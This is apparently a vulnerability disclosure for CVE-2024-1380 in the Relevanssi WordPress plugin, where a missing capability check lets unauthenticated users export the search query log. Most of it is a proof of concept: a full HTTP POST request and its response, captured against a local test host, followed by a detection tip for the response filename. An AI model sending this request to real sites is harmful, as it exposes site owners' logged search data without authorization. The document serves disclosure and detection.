# CVE-2024-1380
Relevanssi – A Better Search &lt;= 4.22.0 - Missing Authorization to Unauthenticated Query Log Export


Description
---
The Relevanssi – A Better Search plugin for WordPress is vulnerable to unauthorized access of data due to a missing capability check on the relevanssi_export_log_check() function in all versions up to, and including, 4.22.0. This makes it possible for unauthenticated attackers to export the query log data. The vendor has indicated that they may look into adding a capability check for proper authorization control, however, this vulnerability is theoretically patched as is.

References
---
[plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&old=3033880%40relevanssi&new=3033880%40relevanssi&sfp_email=&sfph_mail=)

POC
---

Request

```
POST /wp-admin/options-general.php?page=relevanssi%2Frelevanssi.php&tab=logging HTTP/1.1
Host: kubernetes.docker.internal
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://kubernetes.docker.internal/wp-admin/options-general.php?page=relevanssi%2Frelevanssi.php&tab=logging
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: http://kubernetes.docker.internal
Connection: keep-alive

tab=logging&relevanssi_omit_from_logs=&relevanssi_trim_logs=&relevanssi_export=Export+the+log+as+a+CSV+file
```

Response

```
HTTP/1.1 200 OK
Date: Wed, 25 Sep 2024 14:46:13 GMT
Server: Apache/2.4.57 (Debian)
X-Powered-By: PHP/8.2.11
Expires: Tue, 03 Jul 2001 06:00:00 GMT
Cache-Control: max-age=0, no-cache, must-revalidate, proxy-revalidate
Last-Modified: Wed, 25 Sep 2024 14:46:14 GMT
Content-Disposition: attachment;filename=relevanssi_log.csv
Content-Transfer-Encoding: binary
Content-Length: 29
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/download

"No search keywords logged."
```

I would match against filename=relevanssi_log.csv if you are looking for this in the wild as i've not done anything with the plugin.
